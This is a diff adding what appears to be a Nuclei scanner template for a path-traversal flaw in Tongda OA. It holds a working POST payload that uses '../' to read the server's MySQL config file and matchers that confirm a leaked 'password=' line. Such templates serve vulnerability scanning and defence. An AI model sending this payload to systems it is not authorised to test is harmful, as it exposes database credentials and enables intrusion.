@@ -1,0 +1,33 @@
+id: poc-yaml-tongda-oa-gateway-path-traversal
+
+info:
+  name: poc-yaml-tongda-oa-gateway-path-traversal
+  author: xiaobaicai
+  severity: high
+  tags: xray-converted,traversal,ct-490542
+  reference:
+    - https://github.com/jas502n/OA-tongda-RCE
+
+http:
+  - raw:
+      - |
+        POST /ispirit/interface/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"url":"/general/../../mysql5/my.ini"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[mysql]"
+          - "password="
+          - "basedir="
+          - "datadir="
+          - "tmpdir="
+          - "innodb_data_home_dir="
